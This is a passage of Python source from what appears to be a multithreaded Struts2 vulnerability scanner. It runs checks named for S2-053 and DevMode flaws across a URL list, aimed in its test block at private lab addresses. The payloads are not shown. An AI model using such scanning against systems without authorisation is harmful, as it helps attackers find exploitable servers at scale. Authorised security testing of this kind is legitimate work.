        S2_053_Hole(url),
        S2_DevMode_Hole(url)
    ]
    verify_threads = []
    for hole in hole_list:
        t = threading.Thread(target=hole_verify, args=(hole, url, res_q))
        verify_threads.append(t)
        t.start()
    for t in verify_threads:
        t.join()
    processer.resultCreate()


def main(url_list, ex_result_q, processer):
    url_pattern = re.compile(
        r'(https?|ftp|file)://[-A-Za-z0-9+&@#/%?=~_|!:,.;]+[-A-Za-z0-9+&@#/%=~_|]'
    )
    res_q = Queue()
    threads = []
    url_q = Queue()
    for url in url_list:
        if url_pattern.match(url):
            url_q.put(url)

    _thread_num = 100
    if _thread_num > (url_q.qsize() / 2):
        _thread_num = url_q.qsize()
        print('thread_num:', _thread_num)

    for _ in range(_thread_num):
        threads.append(BatchThreads(url_q, res_q, processer))
    for t in threads:
        t.start()
    for t in threads:
        t.join()

    # for url in url_list:
    #     t = threading.Thread(target=scan_single_hole, args=(url, res_q))
    #     t.start()
    #     threads.append(t)
    # for t in threads:
    #     t.join()
    # result_list = []
    while not res_q.empty():
        tu = res_q.get()
        single_result = tu[1]
        if single_result is None:
            continue
        single_result['url'] = tu[0]
        # result_list.append(single_result)
        ex_result_q.put(single_result)
    # ex_result_q.put(result_list)
    #print(result_list)

if __name__ == '__main__':
    url_list = ['http://172.16.8.86:2008/123', 'http://172.16.8.86:2045/123', 'http://172.16.8.86:2008/1111123', 'http://172.16.8.86:2015']
    #	url_list=['http://172.16.8.86:2008/devmode.action','http://172.16.8.86:2013/link.action','http://172.16.8.86:2015','http://172.16.8.86:2016/default.action','http://172.16.8.86:2029/default.action','http://172.16.8.86:2032/memoindex.action','http://172.16.8.86:2033/orders','http://172.16.8.86:2037/orders','http://172.16.8.86:2045','http://172.16.8.86:2053','http://172.16.8.86:2088/orders']
    # url_list = ['http://172.16.8.86:2008/123']
    # perform_s2_tasks(url_list)
    ex_result_q = Queue()
    main(url_list, ex_result_q, '')



